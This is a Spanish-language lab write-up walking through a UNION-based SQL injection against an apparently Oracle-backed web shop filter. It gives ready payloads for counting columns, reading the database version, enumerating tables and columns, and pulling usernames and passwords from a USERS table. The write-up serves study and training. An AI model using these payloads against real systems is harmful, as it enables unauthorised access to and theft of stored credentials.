El siguiente ataque nos ayuda a determinar cuantas columnas se trabajan en la base de datos, al dar con el valor tendríamos una vulnerabilidad.

![alt text](/image/basedatosOracle1.png)

**`GET /filter?category=Pets'`**

- Está enviando al servidor una petición GET a `/filter`.
    
- El parámetro `category` tiene el valor `Pets'`.
    
- Ese `'` (comilla simple extra) busca **romper la consulta SQL original**.

![alt text](/image/basedatosOracle2.png)

### La inyección

2. **`UNION SELECT NULL,NULL,NULL`**
    
    - El `UNION` combina el resultado de dos consultas.
        
    - `NULL,NULL,NULL` es un truco: usas `NULL` porque es un valor que no rompe el tipo de dato (es aceptado como número, texto, etc).
        
    - Pones **tres columnas NULL** porque **no sabes cuántas columnas tiene la query original**.
        
    
    👉 Si la consulta original tiene también 3 columnas, la query es válida y devuelve resultados.  
    👉 Si no coincide el número de columnas, la aplicación da error → así averiguas cuántas columnas hay.


![alt text](/image/oracle1.png)
Al encontrar que la consulta trae 2 columnas la query es valida y nos da la información de la categoría en la que se filtró.

### El comentario

3. **`--`**
    
    - Es un comentario en SQL.
        
    - Sirve para ignorar el resto de la query que el backend hubiera agregado.

![alt text](/image/oracle2.png)
### Objetivo del payload

Este payload busca:

- Ver si la aplicación es vulnerable a **SQL Injection**.
    
- Descubrir cuántas columnas tiene la query.
    
- Una vez que sabes el número, puedes reemplazar un `NULL` con algo útil:
    
    - `UNION SELECT username, password, NULL FROM users--`

![alt text](/image/oracle3.png)

- Descubrí que la consulta original tiene **2 columnas** (porque tu `UNION SELECT 'ABC', NULL` funcionó).
    
    - Si hubiera puesto 1 columna → error.
        
    - Si hubiera puesto 3 → error.
        
    - Con 2 → éxito ✅.
        
- Además, el hecho de que funcione con `FROM dual` nos dice casi seguro que el backend es **Oracle DB** (en MySQL/Postgres/SQLServer no necesitaría `dual`).
  
1. Identificar versión de la DB
```
' UNION SELECT banner, NULL FROM v$version--
```
- En Oracle, `v$version` devuelve información de versión de la base de datos.

![alt text](/image/oracle4.png)
![alt text](/image/oracle5.png)

Otras peticiones: 

2. Enumerar tablas

En Oracle, las tablas de usuario están en `all_tables`:

`' UNION SELECT table_name, NULL FROM all_tables--`

3. Enumerar columnas de una tabla

`' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--`

_(ojo: el nombre de la tabla suele estar en mayúsculas en Oracle)_

4. Extraer datos sensibles

Ejemplo, si existe una tabla `USERS` con columnas `USERNAME` y `PASSWORD`:

`' UNION SELECT USERNAME, PASSWORD FROM USERS--`